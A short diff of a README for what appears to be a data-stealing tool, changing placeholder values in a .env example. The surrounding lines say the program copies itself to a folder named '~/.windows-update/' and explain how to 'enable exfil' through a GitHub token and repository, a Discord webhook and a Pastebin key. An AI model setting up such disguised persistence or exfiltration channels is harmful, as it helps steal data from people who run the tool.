@@ -70,9 +70,9 @@ On first run it copies itself to `~/.windows-update/`. On subsequent runs it ski
 This repo ships with an empty credential blob. To enable exfil, create a `.env` file at the project root:
 
 ```
-GITHUB_TOKEN=ghp_your_token_here
+GITHUB_TOKEN=your_github_token_here
 GITHUB_OWNER=your_github_username
-GITHUB_REPO=system-hijack
+GITHUB_REPO=your_repo_name
 DISCORD_WEBHOOK=https://discord.com/api/webhooks/...    # optional
 PASTEBIN_KEY=your_pastebin_api_dev_key                   # optional
 ```
